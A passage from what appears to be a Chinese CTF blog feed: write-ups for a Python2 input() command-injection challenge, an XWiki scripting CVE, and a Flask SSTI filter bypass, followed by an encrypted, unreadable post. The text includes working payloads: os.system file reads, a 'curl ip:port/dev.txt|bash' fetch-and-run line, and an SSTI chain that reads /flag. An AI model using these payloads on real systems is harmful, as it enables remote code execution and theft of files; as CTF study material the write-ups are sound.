class="number">49</span>, <span class="string">&#x27;v76&#x27;</span>: <span class="number">101</span>,</span><br><span class="line">       <span class="string">&#x27;v50&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;v61&#x27;</span>: <span class="number">51</span>, <span class="string">&#x27;v71&#x27;</span>: <span class="number">57</span>, <span class="string">&#x27;v82&#x27;</span>: <span class="number">102</span>, <span class="string">&#x27;v83&#x27;</span>: <span class="number">101</span>, <span class="string">&#x27;v85&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;v87&#x27;</span>: <span class="number">125</span>, <span class="string">&#x27;v80&#x27;</span>: <span class="number">50</span>, <span class="string">&#x27;v73&#x27;</span>: <span class="number">101</span>,</span><br><span class="line">       <span class="string">&#x27;v66&#x27;</span>: <span class="number">101</span>, <span class="string">&#x27;v59&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;v52&#x27;</span>: <span class="number">101</span>, &#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">sorted</span>(res):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(res[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># flag&#123;7e171d43-63b9-4e18-990e-6e14c2afe648&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="pwn">Pwn</h1>
<h2 id="babyjsc">babyjsc</h2>
<p><strong>Python2</strong> 的 <strong>input</strong>
有个命令执行漏洞，随便搜了个 <strong>Payload</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls /&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls /home&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls /home/ctf&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat /home/ctf/flag&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;c4e39be1-666e-43c4-bf9c-3b44bd280275&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 GACTF 部分题解</title>
    <url>/2020-GACTF/</url>
    <content><![CDATA[<p>中午没休息随手看了几题。</p>
<span id="more"></span>
<h4 id="xwiki">Xwiki</h4>
<p><strong>CVE</strong>，参考<strong>https://jira.xwiki.org/browse/XWIKI-16960</strong>。</p>
<ol type="1">
<li><strong>Create new user on xwiki.org (or myxwiki.org)</strong></li>
<li><strong>Go to profile -&gt; Edit -&gt; My dashboard -&gt; Add
gadget</strong></li>
<li><strong>Choose either python or groovy</strong></li>
<li><strong>Paste following python/groovy code (for unix powered
xwiki)</strong></li>
</ol>
<p>随手上了个 <strong>y1ng</strong> 师傅的车。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(os.popen(<span class="string">&quot;id&quot;</span>).read())</span><br><span class="line"><span class="built_in">print</span>(os.popen(<span class="string">&quot;curl ip:port/dev.txt|bash&quot;</span>).read())</span><br></pre></td></tr></table></figure>
<p>把 <strong>readflag</strong> 和动态链接库整出来以后直接跑。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&quot;./readflag&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Which number is bigger?  &quot;</span>)</span><br><span class="line">        a = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;:&quot;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">        b = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">        <span class="keyword">if</span> a &gt; b:</span><br><span class="line">            io.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">            flag += <span class="string">&quot;0&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            flag += <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># gactf&#123;XWiki_CVE_without_permission_scripting_execution!!!&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="simpleflask">simpleflask</h4>
<p><strong>ssti</strong>，过滤了逗号单引号空格和加号，还有
<strong>os</strong>、<strong>flag</strong> 等，字符串拼接可以直接使用
<strong>"fl""ag"</strong> 绕过。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">103</span>].__init__.__globals__[<span class="string">&quot;open&quot;</span>](<span class="string">&quot;/fl&quot;</span><span class="string">&quot;ag&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 高校战“疫”网络安全分享赛 部分题解</title>
    <url>/2020-GXZY/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="26d936a37107100dd44685696436328c950133662d416bdec8852d505bf6c068">7e2e5d8e84a6dbe261d42399a5b5d3674947ff1f72b8abc6f6b6e4733ec8203e132cc276ef58ee3b0615657bcbf9377ec02abc8791aaf485c4682aeaa5844e3c12c8c894e4bc8bcfbf4f0c4dca1fd0ecd97681a11d0b3bc30acad7c667c6893678533097c1d6b0620022c1941864cb38bff0c7d4fc487bf9e1f7dab67aef1f9c6b7a2a81ef3766bc95d63dad235afa97df11ccb97c959e06b618cb16c19c0146edeabc052494a5c0495d6c5c15a7420257a60adda6a7210f26d7c3c2019072642f86d9db6c84040c8611ae6fa6ecb181fdbc81f2db8b108b1922e89216b6d34fa40c72f7e8c525f32a8dced42dc513b14ea712d6f6a65778bfd2abb26a7a6c97f31e307ab73bef2236a9da69446d8fcf0991375e45ee05d2cb9d61ff166b6a11ab3be01a936a1189e6513e012bd74f03b872b69d9a8cbdd7a5376252b74b450a52186b37ce134a9222a5b385d94a1f5347e76d2dad072f71d483ca19ce350eab8f95c2e28b53546297400defbe15d328d22e16ab744e82057f346b64c2b59a6c6f29a440c0405679c7c60de857b44dc71a12e876224532e25db4ecd9826b02eeca48584f0f3153190703a3a5773141c234aebccf8292aef06c8ec196370de92a7e7ae20f1abfd68efa6f0c5784504eb5a10c8a326bd8557f7545d8ef7464bb5a7c94d8bdee675f84c2177b9bfc205183bdf782908da5d90f7a3eed1a6e7096e2329a332c1eb673d85fe2db1d6afc24058affd97e0711cce656ed82331a85a175436305ded7e2b103fbe60ef2b7262f0c94d65a9ff787ace1fb4d869a6695e4157c8f9b1549bc1dedc1ebb8ec722c9f3fc1967b45324a7c66a2eb61d977edca07d58313fdcd7161d5f3a659e4fa78450e445232e8a44b1070cfef853dab5df08f1fc320b532f43a015a4a2fd007c473d4934aa14d1b713fea612117e76d7e43dc4a4716de9b88c6795e6e39939f9c20d7112bd5f5fe8179679ee47a229872c768ecac5ff174e8b748b89b619f5ab3b8baf7ee1c98f3361286f6b1ea1dfae813b8a933cc3fc892fa00002db92b2005f3c10b010b07cb01f9f3d388e9381b9de32dd15d420aadcc9183cb2429f9c20fa87b37962166b2d2ceeb09153d97aa91a755a801239eef7f8c21cffb227411eb047b9b4737329717c85255bb8f4e2614e9da98d5f682513fdce1e01cb83a729113a397d11ef639bfe69a605e7e14bb1e1b05250cd333dd8f319d6e2c86eba6569dc201c6e3b00747d77cea18696b16b2252263cad5ec40767ea788f536d81bcc5458e03de107452502a28a19f67d495a560b43e718b5ed1e9c506fc96677f1851ff6e6df3534af8f69fd2acf26f61944199655b48037ffbc014d390a97665e772cf13ae3e39f829e304ad9d7df72565c997cae0d787414b4e0f9212a9a2bdc15096a685ac1c16b76a3cd694f2a11a6a42338c9859d5544847f73c43e5d678ac4ff7c2208e513a98062199c8da50ba3c81d908329d5fb6668bd1a0cfb62622f685e544c3127b5aae592b547b14c0f8373fa36a895dd71e3bd65510e4190724237fb163935740b273f0afa734ff5166c5814a9fdade21b33a9296ebca924f4c3109250683d4f3d876027f5b524264fa03ebdf8f1555f62d44d4294b90bdee0912f87caeb972bd82679aba65be7e8e68f0c5592f992c696f0344a69a9a02e4e268f51cee4f15a1ff6e8eb23f802d4f3075806d12ad002241f497c8855597586b9457f021d2eee6c172c02a95623868c345a60d91f71ba7298ebff23244bf95c8aebe34813f14329e6ec71684064f5031a3b2d55f948c99d01199685ee7743f067a088656c5dd7e0d40ce3616132e89c9cbff495eff6f4ec4e32fdd28dc1863eceb15ee3b00fac91169fb411d8c7bae11063c32a56aaf025c76f193d7b745bca3dcc82f32fb7414d3a536d1b8de187391a05d89cf50d3d7813d729a954c7f7bf2e1f2ef96e09d69d64707ff0cedffac4ab2e900c6bcb0a05877d311266dd66c59b05cf766d032cb0f8539efda40a09d1662e44646952733970cfdf7aefa7da83dd55733d9cff5c256064546644a900446215991fc0b38819f14ad42b05dffc1a5b30b0b80879decfde8c8347af21eea8b80c829f56aa066e42a4c0356bb089b372ce9d827fe9c494c7af4407689940db67f17a2656776552d36815823e39f7257e6ff5fc5cf149e96c8e842f18693b6fa1bfe6042295d0cf911a647dac3f9f3172f16fbc466a3430381b7249791d11c6052dccb2db10f485a46629977f5b4262ad68ff0dbbfe6777ad7dcd8fdbc0615b6f389e51f06954e73f8787d026631300ddfd76387b86bc6c99190e704b6fb38f39f0aa8d07fe47a3b9acb173dc8f605bbde30337288856291c075129bfb47c75b402d660ffc6ec9f18ed1a04e3620d08767b6691740876057d6b03ece3f0090c59722314135e7ac7beb2246b89a43310da0ef4873246bc022626e24ce23843ec2b20718d1122c5063dd0844bbfbefc3cf6cd3825fc6fb27414dc404b7a86659ac3e4f407a558b80708f0fbf9f0fe88b4b6002b32d2ae00e077e20746841709c36a0f7d82b9af51e1a899f05231a17971ab4f6b43e51955db6771ee186a82bc30fcaf57d75e2b35f28d6d41c93d383dd31c8b782ea261e37c2afbac85fb43a65ab7005dd66b8a130922327e3f9ef19775ec79e5e7c1956a730f9a07be1429b4d263266543f7e39439737e259059d0634feec94193cb444b3c3c1199da9eb35ac71e9dcf0cdaf22eba119f687add016e5d8bca0f94ad527128c823f057649968565966a4f38e776b5542704fa17b7872eba7797d38783d078cb475e70b485e993f113272df08cd0411cfc5afee6ce3c07db569a433e65e6fadd5839cd981e017c3ec040b47ee443c508558ae476d55e3884f80ade61913db643cd17d71a7a9cde1e59713c13caf8658f77836be7b92c8be801c8df0b1ddb3f8f978e9a31a7d3d76484331ad214c555c3f893b3e685dd5a4c9ec3ee8234891d755a52d964b56799ecd8bb0e68763b01ffacde838a893843d77b5cc79040472bf6e50e8e2d8eebfb305f543d59ab3ae574633c0df72b8e0c87fce9f0169e5841365da0068ebd3aab0b1b25cdb0e0a0954ac99f52f89f1ec0242510adeeb9b1156dfe81edd3f2922c2094cb439e9bba0477fc90e85aa0635e8d406351a81ecc18ad1649ceed8b5d954b363bcb08545ebafa0196bc595f85867ec6264cf25113ee154f6a7d197e807833193731e904739da09f621140b1a30bb14e09ade14d77ed168572985311dcc0ba33368523c7c9a9f2869798b593a51ecfc92be34e90901756ddd2becfdb5cd1aa4aeaec76fa9ccd3dc4543cfef47d9f37ac71c4ebd37a82a6c7ea0f4969d38664f90a3e6b0e8abd86bd75dd03c76e0d9827935ac402c50be67589fbc32100a25cc364400614ce67ad413a4e9500ef03c572245f57f32b9b1ba0ff2b2bfe9b4780ecbf0297c09553c2710945647beed7f821b1be4324816c08d0dcfcc9da05fd06af600aef601426cb589026c3da516c76c13b2b65fc5c048edb4a5e891fb824612ebc48e6f3a796a20c3ba3d0debae974831bd3d87e454dbf3bd53fd91b6b96ceb27929f0c4519aaaa5e445831ff74d9b32020a66c997b1cb54e4b13c8ba28832482688ca8748a2f98f657ff11880b61f8aa3c4b8a99b2d32b62cfe68fae0969790b5fd5ec5913d0e3f32d289ae8769a8a11912907d94df20b2cff3863fdcae9baaa326d4a5ba2e1b2757616f0aa727db7a0a2698005ee91995d9281c01ceeb22d7b16a0f8f5a0185665c0f794a08e3be3b56b347e703730d0bb1da4cb4660a1b264627028250bd3e9bd1697adfd16542848af8a99b7f91244377c485f71e07cca254c09f12f9879a4bcd96b581786be2e5520430c791d63a0f41948a64277b6c21e405667f70871f566ffcd76b8f0b03fb69382d99b2f844c593dd25ca532bd25a8550e4673efeb611d8a2c38483abf203a4de57c08e23f60d4252096ae910bccb6f3697754575b31d13ec4c8011485260dc32cbc0dbae7a7af5531c6207412becdc2fd41e36844dd09942652c1fd579a7d4f665e941561bbf6d8ed7db48e5f594125fe48835dedf78f3bdd9fa95a88afc978dd073fa02b12a07fa84cd6ebda4a681f5e0847261011b6869b2dc4e428830bbcbc6aa7960bc80122a2de31ef5cc5ec1efa35e0c34fcf73980fa692827de68a26b5c5fc29185908ef74d80586971b5ff7c93c064d4b7e633761d42ec48e7563400f9426afdd226f738432c189a30a92a2b141a1ab40cbd774dd26ba78bfe154bb3d8f8a9539d78f3b835c056dcbf13160a604d8108f70c7291753f31d4db3e0b5a3a719f6d8016cec9b66db77d193fb1976c03b4518fdbd2a9ed8ef37043860ffaeb99f9ba79f4466a1e2c96550ed4cc2b29be0505f1ae1b1b6b1371d773c3f8167d5520cc35c5545aef6b9e1ae5015c894e64094320a57a818debc8293f92e27c27d30e8fc8ddfc35003b7aeaa95c61e320f4a6d72f4df7f59fd4a0fe6ec84a501723d8af22d649fda6ce35fe99be1b014cabb3ae69a1f70e05bb60feb788b51e4ca539586b5484fb7b8a56c08eeee858ceb1c91aae5befdd532fb3a465c78e1b6f75671ed9a6d1e0c0fa819a08c7ecc7db02f057ed284d1e5f39f5666fd7e81775b86f3796446004fcb766584620cdc600149495852a4cf0986ac05edf70e123256c7b6b064dc8ae5eaf820e79bbe5110c47d987e94b2f7799892bd59a8b7745e31b6b79b45bb7af6f674a4e64f4d76462176f813252a7048c2d90f4a5a5aacdf9c496ae7743513f32165a1d671d602329a36100935ed3eeb838e328655b041ec52324359464caee1eeb5f1fdbf335858c378e9e5375564466ead2f486321e34f4d6168b2e49c21589ad3f3f365fc5417598dd440763751b3d19e1bb708b00287be8d09145c38acc7e6fa597966a27afc93e06aa475d26152e343935dddc5db68d9e4c4c7f30fbc074d9fc9bdcaf650e5e6e3431cccdbbf791d333fd8680694232ba71e650d63c018b9b876258d89b50a376548eb25fc6034d4cceef1d7b228bcd5248fa931e92c7edfdddf12f2311017d2855cf4aa2b2351ce4e7c510fb406a0fbbd3f9796bf479613830b5ab157d88ead52b5a4e8df8c1f54bb36f1e3a6ae590b525175ad8847476bc7caa73088dd70a55395ce52d34dc92ee429f2ede98022b85823b310f14f19f0a9d3885c946a4c38ad3d9a64087de325c8c8320ac531d091810c560e3e5e3c6270030edd0901e24ac915770959709349455918ed4f416fced44ec911a4e485a8c25adf10ef24b85204acea30644fde0a61b2c7fae1449e24de8963654c08eced8e234e7cb8a7124091194731f77213635285ae9b51506926a2433f9837e047a397b1db5257cadd199db2d1f7f127da123d633bd45f372e817c03651e5a45b92033209e422e0a9ae5f6b8c65175e61b5d6b48e2d26dd4304f3b58fae56c87c75a3ab70f326064635f394d759ff83b900f12fb178fdc279a66a8e025e376a08b557a7e5ba8b8bca55dc43575244008972243c9cdbf4319fbf45b0a8f8e9339f51a399b4203d61fb6cc522cd74ffb22bc1c1b382f2858f973c08f5db1692bb8338fc1087d9db9e4c4be44c57de4999c50afcf5a93805149cd6baa24375469e5d9a902d2a253328e201fc527262c6c895218b7c18ca914207ca6fdb868a4343431a087e7e88b5e694160c7998e07ad46ee5fea0ce502331b43bcb569260ee9887fd026c4e14fd77f7a716e3cc5c4e30f3ac87357ed4e79bd269b00cf8c1376677af5e298c68ae1225f2f6a8eafebb1aa257f58ad525ae680d907226395848ef4ff6bf5b723de61cea6a84b95d613da30cf74ebcd3d0a1c42df90ecc5ad2444b946cebca59e4a0a65540b0ece360b4f04a7da691a80e4a86389f3781e4b009a9167919ebf21a9eabc38638c0a11c2f4328fdc4b45d5a903253985454c5589116be338c741ab9bfccbe2a03734e86cccf962c000e958657ab54da26642d92abf6fc7370d75d6a924bffa39ffeb5b0467736c29e5b3d4ef032333c4ee42da7493918225b2880ee7a7fbc4f86ff8639520780cbad22c62ab3832ce566684e6074d670495718a0d7e83c19c5552cfd113789a258719288f191869bba1be06d1e403fd52043a9decdc025188922a3485c1f88381cd02e4a2facae08145539259f8c7d100c03f9faf4bb5b71c2be1d5224e5c23daa6b9b69b0a15437e2f9f5bb46720ba92cc312d9597b7ab3dbea5d5222be6130960395d85b083cae3ae65725cb787a023e6ad3a85bd85c5c41e0ce96b0f8e313032579b3fb051bcb1920d8fe681d90a39a944ae881527698985ca1db6684bd87f8ea5e93f0afedad033887812c7d79d526a33447f32b0c3334161f4785a1980e6f5ddda02a6dff66a11b509e969e80ffa9c10394c4325f73e89be7c3d2ecc23ca46005d45a05b2e03ff7850315de0a164b287b5c89575c38e52959a0315e1f9cbe70750c16041e237c1fceee1ce21c1e44973954b89d1b049cf014304c65f5127fb9a7c6089e6aa0ef71b7f86f3b1bb861a115dd7f610237a200ea84fadb9bb06d062029c2e6c018a0d0d42d89753c9508ad74c4257263d8dd3afc0078daa10ab4109c0cad0d0ff390c31211f959d5f438d5a7b87cde34ea18ee664572be750f3a5baf04003aa293e0feca09fb5b86ac0255118559c2079f525783a1d1878c67ba1dc8ca476f65e57b79b183bbda5e5c358c64edf423a72a9c00ffe11ccf2d4410a6bf018c01b04b6e8d72e94253f9c02005fe3e17ecc5e86a734917d342b5dd0e6fb2d4183eb6db8eb7f007c39e4d8b47795a3f32427bc0871b28dcafd28a7fe0ec09455fd98386724184cc549487fdbe94cab5594bf4c159b5f13bf412f180d2e2ae56bef2b380c6fb4bd93227969c58d830a5f1d03f61d899131ec7a7e97de98fe0f63f11d42ea52d660b9192b34280d9135d99e4434faa99ada86be747142defc0f34641f49fdd061d3d484dde4aa19e8ec92c6c87b205ce651a5de0f375edb73cca76d25c51fabc542b7c7ddc5046fb8621157b3e6d5cf200b382e1259b1bc1d9d44d42d304ce3720d37d89481289a4d4b1c54af5cfc1ca2d336b88727a7fed0c789ff2b52e1b132fec035ff2695afa5bf6bc9a33f14d5900698f1d293501af4a3fb63be00317c7abfb7b7fa09613f65ea90a871b0a6f2fc63d89d8464087c6bd75325eea06bdfad2651f833c09f927de89f9669ccb2039fd007696742b20b01c22a0c51f802e32fc6150929b9e3fdc3e452c2f0cd7d07c754bd3ebafd1c9c3ab75e417af04d981b71d2584c16f02ed04061946ed36cb18df0043e23495f3ec49f0d64cbcba827fe22055476cc47c6b1148437a7a542c9995f93911c810446bf481b86f73628e9e598ffad12d703873dcf96ed7ca155d821d4a30474405458f02a2988e6e9c352ccd0f3e1f7a8b51973d08c73472d9f7b17b6bda052ac5a85af0e0e6de82e0392a24d81577fdef33a457a2f0e8c468b52a44982e56e6029d019fd17ad8f0fd40a6a1a446421897aa434842c451c9ba055e59e6b93f087b928b94f0618de13f6e2e1814468649cfe8b2ff71690daa14ac87fc283c0a15450408e3afd86389ffccc5db07f3f104109f6eb6ba645a505d603794d6791f313310db45f3705310b94e895602c8816c3109464ad6c59e823d35fc3a59a11a4a2c779980d9102179c76a99050bcc449ca7ff091dbc78c67a4d7a4054270870b23f95f28dbd1deff2f79e6291dd179b648d69000a835505f10ee69f1253c681c7c67745c74e3bfa4eb61acbb3ceeda40fc62a1ba4ec313be443035e479e7a6017ef7216871b7870b27c48e42adb3c82c2ccc06fc2beed2f4b3686eeedcca056d833b21a595dbecef28d672a379f0703d477c535b7317fe33a81b461a2cdf9febbb812ebe6646d5d983fb8e909ee339129b38b7a140303f61fca030996c459e233c8bd6f332f12c660e7797aab829daa8f501c0f38aab55c4f3662e08a0f6a20a748f81287e00bca153140a08b28692d5617a6532112aac7d0eb51e0b28e37ab4e7fa5a8963db13718629e5a678e1ffdf9c572671781d7e2ce2fc09c6561288da56ef2c52844b209ac55bc32fabc6e9da732380efc1d37db8d1db663d29c2f57d7dca84c56fd8fe68bd33bd305edac92f6d08cbfb9505566cc6ef5de82038e91bb17265753c60181a6089d512662eae854087be26518e7d7b0f2dae785571b23f4dadb8dd7c1ad7d40dffdb21c5b4d074c0bb5584834a7fdcc34bbed2d565b6358c67aaa5a002bb1de86f69a0b77ca67ba0eb9ff09380e8ebd88412382b6ebdac608c89629da0cfb198b7bcd95a11497add67ad689980c288d6fbfaee9726688133d9b30fd10962fa725312b4acac9becc2187c488f424c4406df72d427b5fa6d8a058c02bd5c8d0f245b86352f3cf1c3fb79c722deb987322583450b47a7a42b6151cfd1b0992e618b910611917076d814c9be0ae164d60ad5375355c0359239e3169519b81642a2e658cc3eac461de0bd830ed0acb3fae9877b85964ed2f871969eef07b26782fec558df58cd7a7d1e017928d8ca94135fa1a4f3ed44275abfbaef8415acf6f665f4e63fe956afe9d37e8c3b6c3e87e16dc8a39c381adbe8092e1bd59cbe5ea4ef48b7e50116bb93b3a6a47b8a8d46b2764fbf26245e9a74fd25faca4d29f6273b5e3f3be100d668223ea910b1739d9b83e08187bc8d9be7649344ad057e1cd5e08963942fc4a405ffa8fc9be835962eac5d719f2c6c3dd5762f98894bf03853c664669bce9629b3a3c203bf22c69d24002c0f5605498c8d9ee33bff30ab35f0d5628ff37e45bfe85f9b5a71283480e30ee07b27d227d4590d2c20059cbdc04c44722adf16f24a06e5b48c527a671e13736005f344d89c8fbc3ee1bce7c575c8ee7c8d7e8fc02cd8383e65feff1a57cbf143861a32b6b608cb5dfd3cd8e4d925ceaa55a61dadccb4ad466e97cfb6988d83eefd72e50c80904db0e727ae5f1fdb8a3dfd2f3ebfbaf247509542a444ccb9c905140d64a3b42f1241c46aa39906cbc32f35cf0fa68f2048c6fc5873c8b122707731e56e5b0a5830c9c6eb67d4aebd1a3a8d6e919ae56c793ba36e224615fcb17701bc1ff1f50b230e99ed349286e21704fb1819a29d0badb7faedcb80355dcfcbf68e32867c623e5d2a5aa0d9d6dd2fb6cb7e7b9bf3cf2799f039c3444ad986ce69cfb62be289f7675c5e5248466b36320cac6c55ac0b119c66de7bdeea3e18c1884b0b3ed171047cae41b18b36cdba519a4472dff4649dc47f5abbb6870d7063f2a6ed648b45dd2564585d1a83278a4ea6a6d645f56cad41919d03c85a3901173e46ae6b3cefd4cd042c7d00c2d546240167b6a6e9e55e73b1c056944da0e08862aacecb2384239ed2234e6dca5e7e54bcee564ba64f001bbc4bf6f5130eb7739171423ad5b8950cf4eafd9fa011cceeb80330b8a45a4bf5da35df158a94d466a67a980aaf6f857d9455879ffffe56e4f34c31aa5670f947b00f5c77d500650066837696b589a33a6d05d36e37f974b179aa32bae15705b8bd98e8d775cfc9e3cb87a01dec6d7be8f43e142eb6c1289a5c23af374d1f1ebfa5066bbc57cde87ae9018aa986bc3b2b0bdcb8c55cc7f8d9526237852aac96dfed025a852b19dd18d21491313077bd6bf707234921d30bfa3749512f4a667887758ac8e4ccdc861ec56687d45a8c4ef451809181e27a083dd4dafe78417ef26b81d168fddd50c7e07cd95b8c66ae8e2e39a0c833ab485328e7855b92536aa1dfd8e1fad07dfc1964e0134335d88696d4f2e10ff08b78d3e2682066aeb0f0b23bd3e6f25a41d6b1f9d0b8c2e0508cce32a0a782a926fd8c987a1ed89a1d5860873bcdec7c2f12d95ab6b1d984e398df2263b9be07173078fc1c253bec0a91e2b909985a6803cba31abbccd42ca4036bab0cb4226e17158a29726541b9b7a2433a582a83cbacf3843c6c0e3eb06f18ccebe9ab30373113c6cd1c860ff16d65d3a9b63bd3db3c8eb31a74c780197132efc385c0d7bcd64652674229588d803eae3e9bb721810dbcc5ed8f62ab6b6c9c7ef6ba3c7a4ccda62c1ac2485fd04302635270d6f802f969fe0ffa238e72f1e057463ccd2e7142bf4b17bbe6b30206106a0446389cfed7fb043744a69c2195d9379cff7ca12a96c06b8f89e29d318faacc3c1c07df4def8bcbe1ac466eaacc9d0775ccbba4d5c66bdf32602c6621bee369947f65749582d75d29ca95b3c9a7e7da1d46f2f6853765ee3b4e96983459da1546adeb440ea777170351b3522a768167f80474990df2fd2f4b6d4f1b514e08e56c82244e937192041b67eaaf01142a29909f8711ee7e961a721f93d6a9b940e53172148399c9afd58d996583abbf282486b7bc14884420f2f074c890956b7be1328c433e9efdf93ec25f404b37331ee243df3e7d921aa1f3c0a9b3d9d94453e96ff1f03f36ee20fda7970449571379020f862de5744fff3ee4d4595f0783a73a07310f12387ffa8ded41f9eee0bed712918289d253513698648af72e732bc5a94827d3cfcd55359d0713ca3fcc0050ab377c5ba16bd7314074487968460e355390a4024072b8c33b55e7515a2ab7d8aaba0eb48e5868704f307931138e00f4f46c458bbe3c436cb038950dc62ca9d6207a842f02eb60033a175763c157f43c9f1908c057ad7056ddd1ba396e2440da873fba74e8e224bd95302dd4ed9640877c50ab49907ae47ee25258cd4aafed0ace68eadf0bedab3141b5cdddedf534e3322b6fb444575e15ba801eb03db76d9248b2220650e7f6abc71507f3cf105e8ce430bc798f14a7aeba5d23649193fbd545bee45cb97d55bb611bba45a596ad6cbb3c7142a424ffabf08d8627725d6eaedbb72a79b427f0e33ba9916c38ae95b6894514dcadab9637f29c2f70625437fb6adf6f82b98f78e5f94b0ffdf80643d2be15bbf2d8c93491a47fa3392d2ca40cb82978d0b046be1587ec65008399b45ca3b2b4fffff6b27396a4fe7561b6b6806c27d7df3b6a61b7d45f8090b6050b3a282c7cc38cfd3bb66ac6aa559d7be6a0f83a717af0c5e9b90d326334a679a9b7b43a76a787e2319bdb0d377819117fa62abc1cf8b2ab96e9fd1372630c7eeb2d0dbd249d4e007f966c204f3cb4c4164ef2a3f1607a800529b4a8387ab4b7f28ed3804921d754adfa6ee3b84237727f406cadc6dd2a9c5f84df2a4ed5557921b08401b132a4800ce53b977e4e6aedaac03360f688fc2f91cbe5862fe0d7353b016f2047c62e67a6d8a068b1a1a7bfebf7abee54384897c8969a577d1d491e02103bcf4ba063f141e13e628b06e98b1a68d9f7f2fd45ad61735f99b9ddededd1a2afcd1b69e63d50bc53176b6ef2001a00a04d6a65cb8f3a8f85428ef0b7589cde7561f61677a731088046d43ecf3b7cef097c307639d02cce19d7a7544bdd9ccf3b89afb6f3bfd1f90fe3137825b2dc08e0648e31f39dd20be269b284324a886aa8b9653d6433ce595236b9c3c750189adce683c99d4c21c253d6bfa0b89852a097e85cff4f89435754d6e138a2494f9404e7cbfbc5f4e0d859f9e4b2d089d2d3a000d14cfbcb3960de5d9721ee18c1eafc9cec2d41841780ae1c4b67a7265bf178be1b7338fd56ba6a652dc2ff5516f1360484e284a72a2b6eb3ca34a4cf2b10d4680c18c5e33ec0fafb76fc4c73f528c025fa5f1ea870e7a329f8e211183701be741a2af3549255ddbca32ed5ba16b892bc47561a4efd9cc9e3b866456766c714c68643c7a9021429451b63c3fecde05507e796a8f1e799f2d4af19077ab650ed5056655d6af01a4a4679bb31160c0c10b72dcef7e9dcd2a9ee9168a1cf0037288b46e82ec71149f0ef250b286c4b25bba316c4f39df8e27c6abdea76025b9f28131e0fd990b9a3e74b53ba62937306c3a2b005e93c304bf261f729daf27766306ea9dcfc340c4c11c6c6694a712d07ab09b4e6ca57cc5147ec1c6fadc8524141ed13e6852dbdcf3edaa2127fcf437b4eecd266acdf01217657ba9ee441f50d2eeb8733202da946ab7fdc64418d4ac085fef19af1fb724180cf250a8d30cb4097e741959c662081dcb674033085dea97f8aff143874602a95b5f3a821d27f737653fdf53c09ed65deb00506b32e7ddcc886397bd22b636d5cd6616aa0cc097c0d00ca3842901f8fab7f60605e5647e22cae7a1e997ea04e77678722e9150a982355a3f5dfbe8fcc97f61294e3ee398a2468bbb84f3643f7da0f20933b484190771fc6d55ddd044d6ed972b3508a4d8b361414b30ef9f3f9aec4667182b4c94a9ef69748a7036318217755085aaf55fdb8a6c6b86165468d802657553566d2845ec23b4e78729b24ca065c013eb2a3476714e4d137cb712454fe77b7ca171ab3ba86ed049ef2a4a0295b8fed11675b86985ff7fcfbd3799802f98c21ce0b2c6973de9c015e5c349eb98ae6a0a23e7dd27a980dce7ce2b0baf14da3708ae3f3119152d0e98af67f2473456443e1b7730263cb7eca503696a07f9df6c8cf2d672035c71eef1ed72d2cef34b548e914eff1fe5e9b52d042dda62208244fd0a84efc72cec6f9186589cd5346a4ea41cab69d19afd37ecde69f355890b4947857bed129e2401f2ca37dbcc8eba00945577886e7b08c80344f14b9abb136409300845e972bc4f89c99867de0b787c7ba09ea7eca0bad2f361d8f1169fa0f6358f75529f8eea1f583db2520170fae3e8d4bb4efb4e8c98c8e4fdab3e6f26df40328ec153023c16ae42cacc4e13c840f0b55d5ac6e6a05876745fe1f676eb8079cb187c2d4894295f24d8dbd302a377d00908e52856c